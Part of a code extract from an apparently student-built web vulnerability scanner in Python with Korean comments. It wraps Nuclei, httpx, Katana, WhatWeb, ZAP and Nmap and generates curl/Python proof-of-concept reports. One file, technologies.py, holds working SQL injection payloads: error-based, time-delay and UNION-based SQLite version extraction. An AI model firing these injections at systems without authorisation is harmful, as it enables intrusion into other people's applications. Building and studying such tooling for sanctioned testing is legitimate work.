# Project Code Extract (Part 3/5)
- **Root:** `d:\3차 프로젝트\worker_entry`
- **Files included:** 15 (Total: 72)

---

## File 31: refine_logic.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\refine_logic.py`

```python

def refine_tech_data(raw_results):
    merged = {}
    for item in raw_results:
        # 1. 이름과 버전 정제 (v 제거 및 분리)
        name = str(item.get('name', '')).lower().strip()
        ver = str(item.get('version', '')).replace('v', '').strip()
        source = item.get('source', 'Unknown')
        
        if ':' in name:
            name, ver = name.split(':', 1)
        elif '/' in name:
            name, ver = name.split('/', 1)
            
        if not ver or ver.lower() == 'unknown':
            ver = "Unknown"

        # 2. 기술명 기준으로 데이터 통합
        if name not in merged:
            merged[name] = {
                "name": name,
                "version": ver,
                "sources": [source],
                "evidences": {source: item.get('raw_data', f"Detected via {source}")}
            }
        else:
            if merged[name]["version"] == "Unknown" and ver != "Unknown":
                merged[name]["version"] = ver
            if source not in merged[name]["sources"]:
                merged[name]["sources"].append(source)
                merged[name]["evidences"][source] = item.get('raw_data', f"Confirmed via {source}")
    
    return list(merged.values())
```
---

## File 32: scanner_integrations.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\scanner_integrations.py`

```python
import subprocess
import json
import logging
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

class NucleiScanner:
    """Nuclei 스캐너 통합 (수리 완료)"""
    def __init__(self, templates_path: str = None):
        self.templates_path = templates_path or "/home/lsm/.config/nuclei/nuclei-templates"

    def _categorize_from_tags(self, tags: List[str]) -> str:
        """태그로부터 카테고리 추론"""
        tags_str = " ".join(tags).lower()
        if any(x in tags_str for x in ["cms", "wordpress", "drupal", "joomla"]): return "cms"
        if any(x in tags_str for x in ["javascript", "js", "frontend", "angular", "react", "vue"]): return "frontend"
        if any(x in tags_str for x in ["backend", "server", "api"]): return "backend"
        if any(x in tags_str for x in ["database", "mysql", "postgres", "mongodb"]): return "database"
        if any(x in tags_str for x in ["panel", "admin", "login"]): return "application"
        return "other"

    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[NUCLEI] Running technology detection on {target}...")
            # 확인된 nuclei 절대 경로 사용
            cmd = ["/home/lsm/go/bin/nuclei", "-u", target, "-tags", "tech-detect", "-json", "-silent"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line.strip(): continue
                    try:
                        data = json.loads(line)
                        technologies.append({
                            "name": data.get("info", {}).get("name", "Unknown"),
                            "product": data.get("template-id"),
                            "category": self._categorize_from_tags(data.get("info", {}).get("tags", [])),
                            "source": "nuclei"
                        })
                    except: continue
            print(f"[NUCLEI] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"NUCLEI Error: {e}")
        return technologies

class HttpxScanner:
    """httpx 스캐너 통합"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[HTTPX] Running scan on {target}...")
            cmd = ["httpx", "-tech-detect", "-server", "-json", "-silent"]
            result = subprocess.run(cmd, input=target + "\n", capture_output=True, text=True, timeout=30)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line: continue
                    try:
                        data = json.loads(line)
                        if "server" in data:
                            technologies.append({"name": data["server"], "category": "webserver", "source": "httpx"})
                        for tech in data.get("tech", []):
                            technologies.append({"name": tech, "category": "detected", "source": "httpx"})
                    except: continue
            print(f"[HTTPX] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"HTTPX Error: {e}")
        return technologies

class RetireJsScanner:
    """Retire.js 스캐너 (안전 파싱)"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[RETIRE.JS] URL scanning (limited) for {target}")
            cmd = ["retire", "--outputformat", "json", "--severity", "low"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            raw = result.stdout.strip()
            if raw.startswith("[") or raw.startswith("{"):
                try: json.loads(raw)
                except: pass
        except Exception as e:
            logger.error(f"RETIRE.JS Error: {e}")
        return technologies

    def get_max_severity(self, vulns: List[Dict]) -> str:
        severity_order = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'unknown': 0}
        max_sev, max_val = 'unknown', 0
        for vuln in vulns:
            sev = vuln.get('severity', 'unknown').lower()
            if severity_order.get(sev, 0) > max_val:
                max_val = severity_order[sev]
                max_sev = sev
        return max_sev
```
---

## File 33: technologies.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\technologies.py`

```python
import requests
import time
import logging
import re
from typing import List, Dict, Any, Set
from urllib.parse import urljoin, quote

logger = logging.getLogger(__name__)

# 전역 설정
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10

def debug_print(msg):
    print(f"[DEBUG-TECH] {msg}")

def detect_backend_technologies(target_url: str, known_endpoints: List[str] = None) -> List[Dict[str, Any]]:
    """
    백엔드 심층 탐지 + 버전 정밀 추출 (Data Exfiltration)
    """
    # 안전장치: 함수 내부에서 상수 재정의
    current_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    debug_print(f"Starting analysis for: {target_url}")
    
    technologies: List[Dict[str, Any]] = []
    detected_keys: Set[str] = set()
    session = requests.Session()
    session.headers.update({"User-Agent": current_user_agent})
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    def add_tech(product: str, version: str = "Unknown", category: str = "backend", source: str = "Unknown"):
        # 이미 등록된 기술이라도 버전이 'Unknown'이고 새 정보가 구체적이면 업데이트
        key = f"{product}" # 키를 제품명으로만 관리하여 업데이트 가능하게 함
        
        # 기존에 찾은게 있는지 확인
        existing = next((item for item in technologies if item["product"] == product), None)
        
        if existing:
            if existing["version"] == "Unknown" and version != "Unknown":
                existing["version"] = version
                existing["source"] = source
                logger.info(f"[TECH-DETECT] Updated {product} version to {version}")
                debug_print(f"!!! UPDATE !!! {product} version -> {version} via {source}")
        else:
            technologies.append({
                "name": product, "product": product, "version": version, "category": category, "source": source
            })
            detected_keys.add(key)
            logger.info(f"[TECH-DETECT] Found {product} via {source}")
            debug_print(f"!!! FOUND !!! {product} ({version}) via {source}")

    # --------------------------------------------------------------------------
    # [NEW] SQLite 버전 추출 함수 (Marker 추가 버전)
    # --------------------------------------------------------------------------
    def try_extract_sqlite_version(vuln_url: str):
        debug_print(f"--> Attempting to extract SQLite version from: {vuln_url}")
        
        base_url = vuln_url.split('?')[0] if '?' in vuln_url else vuln_url
        
        for col_count in range(1, 10):
            cols = [f"'{i}'" for i in range(1, col_count + 1)]
            
            # [핵심] 마커를 붙여서 헷갈리지 않게 함
            # SQLite 문자열 연결 연산자는 || 입니다.
            if col_count >= 2:
                cols[1] = "'VER:' || sqlite_version() || ':END'"
            else:
                cols[0] = "'VER:' || sqlite_version() || ':END'"
                
            payload_str = ",".join(cols)
            payload = f"') UNION SELECT {payload_str}--"
            
            try:
                full_attack_url = f"{base_url}?q={quote(payload)}"
                resp = session.get(full_attack_url, timeout=5, verify=False)
                
                # [핵심] 마커(VER:...:END)를 기준으로 추출
                match = re.search(r"VER:(.*?):END", resp.text)
                if match:
                    found_ver = match.group(1)
                    debug_print(f"    [EXPLOIT SUCCESS] Columns: {col_count} | Version: {found_ver}")
                    add_tech("SQLite", version=found_ver, category="database", source="Union-Based SQLi (Verified)")
                    return True
            except: pass
        return False

    # ==============================================================================
    # 1. 대상 엔드포인트 선정
    # ==============================================================================
    critical_defaults = [
        "/rest/products/search",
        "/api/Products/1", 
        "/api/Feedbacks",
        "/api/login"
    ]
    
    discovered = []
    if known_endpoints:
        discovered = [ep for ep in known_endpoints if 'api' in ep or 'rest' in ep][:3]
    
    final_targets = []
    for path in critical_defaults: final_targets.append(urljoin(target_url, path))
    for ep in discovered:
        if ep.startswith("http"): final_targets.append(ep)
        else: final_targets.append(urljoin(target_url, ep))
    final_targets = list(set(final_targets))
    
    debug_print(f"Target endpoints ({len(final_targets)}): {final_targets}")

    # ==============================================================================
    # 2. 공격 실행
    # ==============================================================================
    killer_payloads = ["'", "'))--", "' OR 1=1--"]
    time_payloads = {
        "SQLite": ["' OR (SELECT count(*) FROM sqlite_master AS T1, sqlite_master AS T2, sqlite_master AS T3) OR '"]
    }

    for full_url in final_targets:
        debug_print(f"--> Testing Endpoint: {full_url}")
        
        # 이미 버전을 찾았으면 중단
        sqlite_tech = next((t for t in technologies if t['product'] == 'SQLite'), None)
        if sqlite_tech and sqlite_tech['version'] != "Unknown": break

        # [전략 A] Killer Payloads & Version Extraction
        for payload in killer_payloads:
            try:
                # URL 생성
                if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                else: attack_url = f"{full_url}?q={quote(payload)}"
                
                resp = session.get(attack_url, timeout=5, verify=False)
                content = resp.text
                err_msg = ""
                try: err_msg = str(resp.json())
                except: pass

                # 탐지 로직
                found_sqlite = False
                if 'SQLITE' in err_msg.upper() or 'SQLITE' in content.upper():
                    add_tech("SQLite", category="database", source=f"Error (Killer Payload)")
                    found_sqlite = True
                
                # 탐지되었다면 즉시 버전 추출 시도
                if found_sqlite:
                    try_extract_sqlite_version(full_url)
                    
            except: pass

        # [전략 B] Time-Based Check (버전 추출이 안됐을 때만)
        if any(t['name'] == 'SQLite' for t in technologies): continue

        for db, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    start = time.time()
                    session.get(full_url, timeout=5, verify=False)
                    normal_time = time.time() - start
                    
                    if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                    else: attack_url = f"{full_url}?q={quote(payload)}"

                    start = time.time()
                    session.get(attack_url, timeout=10, verify=False)
                    attack_time = time.time() - start
                    
                    if attack_time > normal_time + 2.0:
                        debug_print(f"    !!! TIME DELAY DETECTED !!!")
                        add_tech(db, category="database", source=f"Time-Based Injection")
                        break
                except: pass

    debug_print(f"Analysis finished. Found: {len(technologies)} techs")
    return technologies
```
---

## File 34: unifier.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\unifier.py`

```python
# app/core/recon/unifier.py
from typing import Dict, List, Any, Optional

class TechUnifier:
    """
    여러 스캔 소스에서 수집된 기술 정보를 통합하고 교차 검증하는 클래스
    (SocketIO 지원 추가)
    """
    def __init__(self, socketio=None):
        self.tech_stack: Dict[str, Dict[str, Any]] = {}
        self.socketio = socketio # 소켓 객체 저장

    def _emit(self, event: str, data: Dict[str, Any]):
        """소켓이 연결되어 있으면 이벤트 전송"""
        if self.socketio:
            try:
                self.socketio.emit(event, data)
            except Exception:
                pass

    def add_tech(self, name: str, version: str = "", category: str = "unknown", 
                 source: str = "unknown", confidence: int = 0):
        if not name or name.lower() == "unknown":
            return

        tech_key = name.lower()
        is_new = tech_key not in self.tech_stack
        
        # 1. 정보 업데이트/추가
        if is_new:
            self.tech_stack[tech_key] = {
                'name': name,
                'version': version,
                'category': category,
                'confidence': confidence,
                'sources': [source]
            }
        else:
            entry = self.tech_stack[tech_key]
            entry['confidence'] = min(100, entry['confidence'] + confidence)
            if source not in entry['sources']:
                entry['sources'].append(source)
            if (not entry['version'] or entry['version'] == "Unknown") and version:
                entry['version'] = version
            elif version and len(version) > len(entry['version']):
                entry['version'] = version

        # 2. [방송] 실시간 로그 전송
        # 예: "[+] Found Nginx (Confidence: 60) via Recog"
        log_msg = f"Detected {name} via {source}"
        if version: log_msg += f" (v{version})"
        
        self._emit('scan_log', {
            'message': log_msg,
            'level': 'success' if confidence > 80 else 'info',
            'confidence': self.tech_stack[tech_key]['confidence']
        })

        # 3. [방송] 기술 스택 업데이트 전송 (대시보드 게이지용)
        self._emit('tech_update', {
            'name': self.tech_stack[tech_key]['name'],
            'confidence': self.tech_stack[tech_key]['confidence'],
            'version': self.tech_stack[tech_key]['version'] or "Unknown",
            'category': self.tech_stack[tech_key]['category']
        })

    def get_results(self, min_confidence: int = 30) -> List[Dict[str, Any]]:
        results = []
        for tech in self.tech_stack.values():
            if tech['confidence'] >= min_confidence:
                results.append({
                    'name': tech['name'],
                    'version': tech['version'] or "Unknown",
                    'category': tech['category'],
                    'confidence': tech['confidence'],
                    'source': ", ".join(tech['sources']),
                    'type': 'unified'
                })
        return sorted(results, key=lambda x: x['confidence'], reverse=True)

    def merge_list(self, tech_list: List[Dict[str, Any]]):
        for item in tech_list:
            self.add_tech(
                name=item.get('name'),
                version=item.get('version', ''),
                category=item.get('category', 'unknown'),
                source=item.get('source', 'unknown'),
                confidence=item.get('confidence', 50)
            )
```
---

## File 35: web.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\web.py`

```python
import requests
import logging
import subprocess
import json
import shutil
import os
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

def collect_web_info(url):
    """
    이상적인 스캔 워크플로우:
    1. Katana 크롤링 (URL 수집)
    2. Nuclei 스캔 (취약점 후보 탐지)
    3. 필터링: 취약점 발견된 URL만 추출
    4. ZAP Targeted Scan (취약한 URL만 정밀 검증)
    5. VulnerabilityVerifier (실제 검증)
    
    Note: WhatWeb은 Nuclei의 tech-detect 태그로 대체 가능하지만,
          일부 메타데이터(IP, 국가 등)는 WhatWeb이 더 정확할 수 있음
    """
    results = {
        'headers': {}, 
        'webtechnologies': [], 
        'nuclei_vulns': [], 
        'zap_results': None,
        'verifications': []
    }
    
    # Step 0: 기본 헤더 수집 및 기술 스택 추출
    try:
        resp = requests.get(url, timeout=10, verify=False)
        results['headers'] = dict(resp.headers)
        
        # 헤더에서 기술 스택 정보 추출 (Nuclei/WhatWeb 실패 시 대비)
        server = resp.headers.get('Server', '')
        powered_by = resp.headers.get('X-Powered-By', '')
        
        if server:
            results['webtechnologies'].append({
                'name': server.split('/')[0] if '/' in server else server,
                'version': server.split('/')[1] if '/' in server else '',
                'source': 'HTTP-Header'
            })
        
        if powered_by:
            # PHP/5.6.40 형식 파싱
            if 'PHP' in powered_by:
                php_version = powered_by.replace('PHP/', '').split()[0] if 'PHP/' in powered_by else ''
                results['webtechnologies'].append({
                    'name': 'PHP',
                    'version': php_version,
                    'source': 'HTTP-Header'
                })
    except Exception as e:
        logger.warning(f"Failed to get headers: {e}")
        print(f"[STEP 0] ⚠️ 헤더 수집 실패: {e}")

    # Step 1: Katana 크롤링 (URL 수집)
    crawled_urls_file = f"urls_{os.getpid()}.txt"
    all_discovered_urls = [url]  # 기본 URL 포함
    
    try:
        katana_path = shutil.which('katana') or '/usr/local/bin/katana'
        if not os.path.exists(katana_path) and not shutil.which('katana'):
            print(f"[STEP 1] ⚠️ Katana를 찾을 수 없습니다. 기본 URL만 사용합니다.")
            logger.warning("Katana not found, using base URL only")
        else:
            print(f"[STEP 1] 🔍 Katana 크롤링 시작: {url}")
            result = subprocess.run(
                [katana_path, '-u', url, '-silent', '-o', crawled_urls_file], 
                timeout=60,
                errors='ignore',
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[STEP 1] ⚠️ Katana 실행 실패 (코드: {result.returncode}): {result.stderr[:200]}")
                logger.warning(f"Katana failed with code {result.returncode}: {result.stderr}")
            
            if os.path.exists(crawled_urls_file):
                with open(crawled_urls_file, 'r') as f:
                    all_discovered_urls = [line.strip() for line in f if line.strip()]
                    all_discovered_urls = list(set(all_discovered_urls))  # 중복 제거
                    if url not in all_discovered_urls:
                        all_discovered_urls.insert(0, url)  # 기본 URL을 맨 앞에
                print(f"[STEP 1] ✅ {len(all_discovered_urls)}개 URL 발견")
            else:
                print(f"[STEP 1] ⚠️ Katana 결과 파일이 생성되지 않았습니다. 기본 URL만 사용합니다.")
                logger.warning("Katana output file not found")
    except Exception as e:
        logger.error(f"Katana crawling failed: {e}", exc_info=True)
        print(f"[STEP 1] ❌ Katana 크롤링 실패: {e}")
        all_discovered_urls = [url]  # 실패 시 기본 URL만 사용

    # Step 2: Nuclei 스캔 (취약점 + 기술 스택 탐지)
    nuclei_results_file = f"n_res_{os.getpid()}.json"
    vulnerable_urls = []  # 취약점 발견된 URL만 저장
    
    try:
        nuclei_path = shutil.which('nuclei') or '/usr/local/bin/nuclei'
        if not os.path.exists(nuclei_path) and not shutil.which('nuclei'):
            print(f"[STEP 2] ⚠️ Nuclei를 찾을 수 없습니다. 스캔을 건너뜁니다.")
            logger.warning("Nuclei not found, skipping scan")
        else:
            print(f"[STEP 2] 🎯 Nuclei 스캔 시작: {len(all_discovered_urls)}개 URL")
            
            # crawled_urls_file이 존재하는지 확인
            if not os.path.exists(crawled_urls_file):
                # 파일이 없으면 기본 URL만 파일에 작성
                with open(crawled_urls_file, 'w') as f:
                    f.write(url + '\n')
            
            # Nuclei 실행 (취약점 + 기술 스택 탐지)
            cmd = [
                nuclei_path, '-list', crawled_urls_file, '-silent',
                '-tags', 'cve,vuln,tech,exposure,osint',
                '-severity', 'critical,high,medium,low',
                '-j', '-o', nuclei_results_file, 
                '-c', '5', '-rl', '10'  # 화력 조절
            ]
            
            result = subprocess.run(
                cmd, 
                errors='ignore', 
                timeout=300,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[STEP 2] ⚠️ Nuclei 실행 실패 (코드: {result.returncode}): {result.stderr[:200]}")
                logger.warning(f"Nuclei failed with code {result.returncode}: {result.stderr}")
            
            if os.path.exists(nuclei_results_file):
                file_size = os.path.getsize(nuclei_results_file)
                if file_size == 0:
                    print(f"[STEP 2] ⚠️ Nuclei 결과 파일이 비어있습니다.")
                    logger.warning("Nuclei output file is empty")
                else:
                    with open(nuclei_results_file, 'r') as f:
                        for line in f:
                            if not line.strip():
                                continue
                            try:
                                res = json.loads(line)
                                vuln_info = {
                                    'name': res.get('info', {}).get('name', 'Unknown'),
                                    'severity': res.get('info', {}).get('severity', 'info'),
                                    'url': res.get('matched-at', ''),
                                    'template_id': res.get('template-id', ''),
                                    'tags': res.get('info', {}).get('tags', [])
                                }
                                results['nuclei_vulns'].append(vuln_info)
                                
                                # 취약점 발견된 URL 수집 (ZAP 검증용)
                                matched_url = vuln_info['url']
                                if matched_url and matched_url not in vulnerable_urls:
                                    vulnerable_urls.append(matched_url)
                                
                                # 기술 스택 정보 추출 (tech 태그가 있으면)
                                if 'tech' in str(res.get('info', {}).get('tags', [])).lower():
                                    tech_name = vuln_info['name']
                                    results['webtechnologies'].append({
                                        'name': tech_name,
                                        'version': '',  # Nuclei는 버전 정보를 잘 제공하지 않음
                                        'source': 'Nuclei'
                                    })
                            except json.JSONDecodeError as e:
                                logger.debug(f"JSON decode error: {e}")
                                continue
                    
                    print(f"[STEP 2] ✅ {len(results['nuclei_vulns'])}개 취약점 발견, {len(vulnerable_urls)}개 URL이 취약")
                    os.remove(nuclei_results_file)
            else:
                print(f"[STEP 2] ⚠️ Nuclei 결과 파일이 생성되지 않았습니다.")
                logger.warning("Nuclei output file not created")
    except Exception as e:
        logger.error(f"Nuclei scan failed: {e}", exc_info=True)
        print(f"[STEP 2] ❌ Nuclei 스캔 실패: {e}")

    # Step 3: WhatWeb 실행 (Nuclei 보완 - 메타데이터 및 정밀 버전 탐지)
    # Note: Nuclei의 tech-detect는 빠르지만, WhatWeb은 더 정밀한 버전 정보를 제공할 수 있음
    try:
        if shutil.which('whatweb'):
            print(f"[STEP 3] 🔎 WhatWeb 정밀 탐지 (Nuclei 보완): {url}")
            cmd = ['whatweb', '--log-json', '-', url]
            proc = subprocess.run(cmd, capture_output=True, text=True, errors='ignore', timeout=30)
            
            if proc.returncode != 0:
                print(f"[STEP 3] ⚠️ WhatWeb 실행 실패 (코드: {proc.returncode}): {proc.stderr[:200]}")
                logger.warning(f"WhatWeb failed with code {proc.returncode}: {proc.stderr}")
            elif proc.stdout:
                try:
                    data = json.loads(proc.stdout)
                    if data:
                        plugins = data[0].get('plugins', {})
                        for name, info in plugins.items():
                            # 중복 체크 (Nuclei에서 이미 발견한 기술은 제외)
                            existing = next((t for t in results['webtechnologies'] if t['name'] == name), None)
                            if not existing:
                                results['webtechnologies'].append({
                                    'name': name,
                                    'version': info.get('string', [''])[0] if isinstance(info.get('string'), list) else info.get('version', [''])[0] if isinstance(info.get('version'), list) else '',
                                    'source': 'WhatWeb'
                                })
                            elif existing['version'] == '' and info.get('version'):
                                # WhatWeb이 버전 정보를 제공하면 업데이트
                                version = info.get('version', [''])[0] if isinstance(info.get('version'), list) else info.get('version', '')
                                if version:
                                    existing['version'] = version
                                    existing['source'] = 'WhatWeb+Nuclei'
                        print(f"[STEP 3] ✅ WhatWeb 탐지 완료: {len(plugins)}개 기술 발견")
                except json.JSONDecodeError as e:
                    print(f"[STEP 3] ⚠️ WhatWeb JSON 파싱 실패: {e}")
                    logger.warning(f"WhatWeb JSON decode error: {e}")
        else:
            print(f"[STEP 3] ⏭️ WhatWeb이 설치되지 않았습니다. 건너뜁니다.")
            logger.debug("WhatWeb not installed, skipping")
    except Exception as e:
        logger.error(f"WhatWeb scan failed: {e}", exc_info=True)
        print(f"[STEP 3] ❌ WhatWeb 스캔 실패: {e}")

    # Step 4: ZAP Targeted Scan (취약점 발견된 URL만 정밀 검증)
    if vulnerable_urls:
        try:
            print(f"[STEP 4] 🛡️ ZAP Targeted Scan 시작: {len(vulnerable_urls)}개 취약 URL")
            from app.core.scanner.zap_scanner import ZapScanner
            from app.config import Config
            
            # Docker 환경 감지: 환경 변수로 ZAP 호스트 오버라이드 가능
            zap_host = os.getenv('ZAP_PROXY_HOST', Config.ZAP_PROXY_HOST)
            zap_port = int(os.getenv('ZAP_PROXY_PORT', Config.ZAP_PROXY_PORT))
            
            zap_scanner = ZapScanner(
                api_key=os.getenv('ZAP_API_KEY', Config.ZAP_API_KEY),
                proxy_host=zap_host,
                proxy_port=zap_port
            )
            
            # 취약점 발견된 URL만 ZAP으로 정밀 검증
            zap_result = zap_scanner.targeted_scan(vulnerable_urls)
            
            if zap_result and 'alerts' in zap_result:
                results['zap_results'] = {
                    'alerts': zap_result['alerts'],
                    'scanned_urls': len(vulnerable_urls)
                }
                print(f"[STEP 4] ✅ ZAP 검증 완료: {len(zap_result['alerts'])}개 알림 발견")
            else:
                print(f"[STEP 4] ⚠️ ZAP 스캔 실패 또는 알림 없음")
        except Exception as e:
            logger.warning(f"ZAP scan failed: {e}")
            print(f"[STEP 4] ⚠️ ZAP 스캔 실패: {e}")
    else:
        print(f"[STEP 4] ⏭️ 취약점 발견된 URL이 없어 ZAP 스캔 건너뜀")

    # Step 5: VulnerabilityVerifier (실제 검증)
    try:
        if results['nuclei_vulns']:
            print(f"[STEP 5] 🔬 VulnerabilityVerifier 검증 시작")
            from app.core.verifier import VulnerabilityVerifier
            
            # CVE 정보 추출 (Nuclei 결과에서)
            cves = []
            for vuln in results['nuclei_vulns']:
                # template-id나 name에서 CVE ID 추출 시도
                template_id = vuln.get('template_id', '')
                if 'cve' in template_id.lower():
                    cve_id = template_id.upper()
                    cves.append({
                        'id': cve_id,
                        'description': vuln.get('name', ''),
                        'severity': vuln.get('severity', 'medium')
                    })
            
            # VulnerabilityVerifier 실행
            verifier = VulnerabilityVerifier(
                target_url=url,
                endpoints=all_discovered_urls[:50],  # 최대 50개만 (성능 고려)
                cves=cves,
                technologies=results['webtechnologies']
            )
            
            verifications = verifier.verify_all()
            results['verifications'] = verifications
            print(f"[STEP 5] ✅ 검증 완료: {len(verifications)}개 검증 수행")
    except Exception as e:
        logger.warning(f"VulnerabilityVerifier failed: {e}")
        print(f"[STEP 5] ⚠️ 검증 실패: {e}")

    # Step 6: Nmap 전체 스캔 (네트워크 레벨 정보 수집)
    try:
        print(f"[STEP 6] 🔍 Nmap 전체 스캔 시작: {url}")
        from app.core.recon.network import run_recon
        
        # URL에서 호스트 추출
        from urllib.parse import urlparse
        parsed = urlparse(url)
        nmap_target = parsed.hostname or parsed.netloc.split(':')[0]
        
        if nmap_target:
            print(f"[STEP 6] 🎯 Nmap 타겟: {nmap_target}")
            nmap_result = run_recon(nmap_target, aggressive=True)
            
            if nmap_result:
                # Nmap 결과를 기술 스택에 추가
                for host in nmap_result:
                    for port_info in host.get('ports', []):
                        tech = {
                            'name': port_info.get('product', port_info.get('service', 'Unknown')),
                            'version': port_info.get('version', ''),
                            'source': 'Nmap',
                            'port': port_info.get('port'),
                            'service': port_info.get('service', '')
                        }
                        # 중복 체크
                        existing = next((t for t in results['webtechnologies'] 
                                        if t['name'] == tech['name'] and t.get('port') == tech.get('port')), None)
                        if not existing:
                            results['webtechnologies'].append(tech)
                
                # Nmap 결과를 별도 필드로 저장
                results['nmap_results'] = nmap_result
                print(f"[STEP 6] ✅ Nmap 스캔 완료: {len(nmap_result)}개 호스트, {sum(len(h.get('ports', [])) for h in nmap_result)}개 포트")
            else:
                print(f"[STEP 6] ⚠️ Nmap 스캔 결과 없음")
        else:
            print(f"[STEP 6] ⚠️ Nmap 타겟을 추출할 수 없습니다.")
    except ImportError as e:
        print(f"[STEP 6] ⚠️ Nmap 모듈을 import할 수 없습니다: {e}")
        logger.warning(f"Nmap import failed: {e}")
    except Exception as e:
        logger.error(f"Nmap scan failed: {e}", exc_info=True)
        print(f"[STEP 6] ❌ Nmap 스캔 실패: {e}")

    # 정리
    finally:
        if os.path.exists(crawled_urls_file):
            os.remove(crawled_urls_file)

    return results
```
---

## File 36: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\reporting\__init__.py`

```python
# app/core/reporting/__init__.py

from .generator import ReportGenerator

__all__ = ['ReportGenerator']

```
---

## File 37: generator.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\reporting\generator.py`

```python
# app/core/reporting/generator.py
# 리포팅 및 재현성: PoC 자동 생성, 증거 수집, CVSS 계산

import json
import logging
from typing import Dict, Any, List, Optional
from datetime import datetime
import base64

logger = logging.getLogger(__name__)


class ReportGenerator:
    """
    전문적인 리포팅 기능
    """
    
    def __init__(self):
        self.evidence_collection = []
        self.poc_scripts = []
    
    def generate_poc(self, vulnerability: Dict[str, Any]) -> str:
        """
        발견된 취약점의 curl/Python 재현 스크립트 자동 생성
        """
        vuln_type = vulnerability.get("type", "")
        method = vulnerability.get("method", "GET")
        parameter = vulnerability.get("parameter", "id")
        payload = vulnerability.get("payload", "")
        url = vulnerability.get("url", "")
        
        poc = f"# PoC for {vuln_type}\n"
        poc += f"# Generated: {datetime.now().isoformat()}\n\n"
        
        # curl 명령어
        if method == "GET":
            poc += f"# curl PoC\n"
            poc += f"curl -X GET '{url}?{parameter}={payload}' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -v\n\n"
        else:
            poc += f"# curl PoC\n"
            poc += f"curl -X POST '{url}' \\\n"
            poc += f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -d '{parameter}={payload}' \\\n"
            poc += f"  -v\n\n"
        
        # Python 스크립트
        poc += f"# Python PoC\n"
        poc += f"import requests\n\n"
        poc += f"url = '{url}'\n"
        poc += f"payload = '{payload}'\n\n"
        
        if method == "GET":
            poc += f"response = requests.get(url, params={{'{parameter}': payload}}, verify=False)\n"
        else:
            poc += f"response = requests.post(url, data={{'{parameter}': payload}}, verify=False)\n"
        
        poc += f"print(response.text)\n"
        
        return poc
    
    def collect_evidence(
        self,
        request: Dict[str, Any],
        response: Dict[str, Any],
        vulnerability: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        HTTP 요청/응답 자동 캡처, 타임스탬프 기록
        """
        evidence = {
            "timestamp": datetime.now().isoformat(),
            "vulnerability": vulnerability.get("type", ""),
            "request": {
                "method": request.get("method", "GET"),
                "url": request.get("url", ""),
                "headers": request.get("headers", {}),
                "data": request.get("data", ""),
                "params": request.get("params", {})
            },
            "response": {
                "status_code": response.get("status_code", 0),
                "headers": response.get("headers", {}),
                "content_length": response.get("content_length", 0),
                "content_preview": response.get("content", "")[:500]  # 처음 500자만
            },
            "vulnerability_details": vulnerability
        }
        
        self.evidence_collection.append(evidence)
        return evidence
    
    def calculate_cvss_vector(self, vulnerability: Dict[str, Any]) -> str:
        """
        CVSS 벡터 자동 계산
        
        간단한 버전 (실제로는 전문 라이브러리 사용 권장)
        """
        # CVSS 3.1 벡터 형식
        # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        
        # Attack Vector
        av = "N"  # Network (기본값)
        if vulnerability.get("method") == "LOCAL":
            av = "L"
        
        # Attack Complexity
        ac = "L"  # Low (기본값)
        if vulnerability.get("detection_method") == "time_based":
            ac = "H"  # High (복잡함)
        
        # Privileges Required
        pr = "N"  # None (기본값)
        
        # User Interaction
        ui = "N"  # None (기본값)
        
        # Scope
        s = "U"  # Unchanged (기본값)
        
        # Confidentiality Impact
        severity = vulnerability.get("severity", "MEDIUM")
        if severity == "CRITICAL":
            c = "H"
        elif severity == "HIGH":
            c = "H"
        elif severity == "MEDIUM":
            c = "L"
        else:
            c = "N"
        
        # Integrity Impact
        i = c  # 동일하게 설정
        
        # Availability Impact
        a = "N"  # 기본값
        
        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        
        return vector
    
    def generate_executive_summary(
        self,
        vulnerabilities: List[Dict[str, Any]],
        attack_paths: List[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        경영진용 요약 리포트 자동 생성
        """
        total_vulns = len(vulnerabilities)
        critical = sum(1 for v in vulnerabilities if v.get("severity") == "CRITICAL")
